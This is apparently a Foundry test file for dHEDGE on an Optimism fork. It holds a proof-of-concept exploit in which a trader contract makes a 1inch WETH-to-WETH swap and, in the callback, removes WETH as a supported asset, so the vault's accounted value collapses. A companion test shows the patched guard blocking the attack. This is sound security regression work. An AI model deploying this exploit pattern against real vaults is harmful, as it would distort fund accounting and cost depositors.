// SPDX-License-Identifier: MIT
// solhint-disable one-contract-per-file
pragma solidity >=0.7.6 <0.9.0;
pragma abicoder v2;

import {OptimismConfig} from "test/integration/utils/foundry/config/OptimismConfig.sol";
import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {Test} from "forge-std/Test.sol";

import {Governance} from "../../../../contracts/Governance.sol";
import {OneInchV6Guard} from "../../../../contracts/guards/contractGuards/OneInchV6Guard.sol";
import {IUniswapV2Factory} from "../../../../contracts/interfaces/uniswapV2/IUniswapV2Factory.sol";

interface IAggregationRouterV6 {
  struct SwapDescription {
    address srcToken; // IERC20
    address dstToken; // IERC20
    address payable srcReceiver;
    address payable dstReceiver;
    uint256 amount;
    uint256 minReturnAmount;
    uint256 flags;
  }

  function swap(
    address sender,
    SwapDescription calldata desc,
    bytes calldata data
  ) external payable returns (uint256 returnAmount);
}

interface IPoolLogic {
  function execTransaction(address to, bytes calldata data) external returns (bool success);
}

interface IERC20 {
  function approve(address spender, uint256 amount) external returns (bool);

  function balanceOf(address account) external view returns (uint256);

  function allowance(address owner, address spender) external view returns (uint256);
}

interface IPoolManagerLogic {
  struct Asset {
    address asset;
    bool isDeposit;
  }

  function totalFundValue() external view returns (uint256);

  function changeManager(address newManager, string memory newManagerName) external;

  function manager() external view returns (address);

  function changeAssets(Asset[] calldata _addAssets, address[] calldata _removeAssets) external;

  function setTrader(address _trader) external;
}

contract OneInchV6SrcTokenTest is Test {
  IAggregationRouterV6 public router = IAggregationRouterV6(0x111111125421cA6dc452d289314280a0f8842A65);
  IERC20 public weth = IERC20(OptimismConfig.WETH);

  IPoolLogic public pool = IPoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
  IPoolManagerLogic public manager = IPoolManagerLogic(0x950A19078d33f732d35d3630c817532308490cCD);
  address public managerAddress = 0xeFc4904b786A3836343A3A504A2A3cb303b77D64;

  address public slippageAccumulator = 0x2474680A3475ede148B5270f7736Cae6d63c06D5;
  IUniswapV2Factory public uniswapV2Factory = IUniswapV2Factory(0x0c3c1c532F1e39EdF36BE9Fe0bE1410313E074Bf);
  Governance public dHEDGEGovernance = Governance(0xa9F912c1dB1b844fd96192Ac3B496E9d8F445bc9);
  address public dHEDGEAdminOptimism = 0x90b1a66957914EbbE7a8df254c0c1E455972379C;

  function setUp() public {
    vm.createSelectFork("optimism", 121303383);
  }

  function test_remove_src_token_during_execute_poc() public {
    TrickContract trick = _executeScenario();

    // And trigger the attack
    trick.attack();

    // Finally, the Vault has lost the 100 weth and is now holding ~43 USD
    assertEq(manager.totalFundValue(), 43.964297348421959993e18);

    // The 100 weth are still in the Vault but are not accounted for
    assertEq(weth.balanceOf(address(pool)), 100e18);
  }

  function test_remove_src_token_during_execute_fix() public {
    address newOneInchV6Guard = address(
      new OneInchV6Guard(
        slippageAccumulator,
        uniswapV2Factory,
        IUniswapV3Factory(OptimismConfig.UNISWAP_V3_FACTORY),
        address(0)
      )
    );
    vm.prank(dHEDGEAdminOptimism);
    dHEDGEGovernance.setContractGuard(address(router), newOneInchV6Guard);

    TrickContract trick = _executeScenario();

    vm.expectRevert("unsupported source asset");
    trick.attack();
  }

  function _executeScenario() internal returns (TrickContract trick) {
    // First, simulate the pool getting 100 weth
    deal(address(weth), address(pool), 100e18);
    assertEq(weth.balanceOf(address(pool)), 100e18);

    // The Vault is holding ~362,202 USD (mostly the 100 weth)
    assertEq(manager.totalFundValue(), 362_202.734297348421959993e18);

    // Deploy the trick contract
    trick = new TrickContract();

    // Make the trick contract the trader of the pool
    vm.prank(managerAddress);
    manager.setTrader(address(trick));
  }
}

contract TrickContract is Test {
  IPoolManagerLogic public manager = IPoolManagerLogic(0x950A19078d33f732d35d3630c817532308490cCD);
  address public managerAddress = 0xeFc4904b786A3836343A3A504A2A3cb303b77D64;
  IPoolLogic public pool = IPoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
  IAggregationRouterV6 public router = IAggregationRouterV6(0x111111125421cA6dc452d289314280a0f8842A65);
  IERC20 public weth = IERC20(OptimismConfig.WETH);

  function attack() public {
    // First, craft the transaction to approve 100 weth to 1Inch Aggregator
    bytes memory data = abi.encodeWithSelector(weth.approve.selector, address(router), 100e18);
    // Execute the transaction
    pool.execTransaction(address(weth), data);
    assertEq(weth.allowance(address(pool), address(router)), 100e18);

    // Now, craft the transaction to do the trick swap
    IAggregationRouterV6.SwapDescription memory desc = IAggregationRouterV6.SwapDescription({
      srcToken: address(weth),
      dstToken: address(weth),
      srcReceiver: payable(address(router)),
      dstReceiver: payable(address(pool)),
      amount: 100e18,
      minReturnAmount: 100e18,
      flags: 0
    });
    data = abi.encodeWithSelector(router.swap.selector, address(this), desc, "0x0");

    // Execute the transaction
    pool.execTransaction(address(router), data);
  }

  function execute(address) public returns (uint256) {
    // Make sure the pool has no weth
    assertEq(weth.balanceOf(address(pool)), 0);

    address[] memory addrs = new address[](1);
    addrs[0] = address(weth);

    // Remove the weth from the pool as supported asset
    manager.changeAssets(new IPoolManagerLogic.Asset[](0), addrs);

    return 100e18;
  }
}
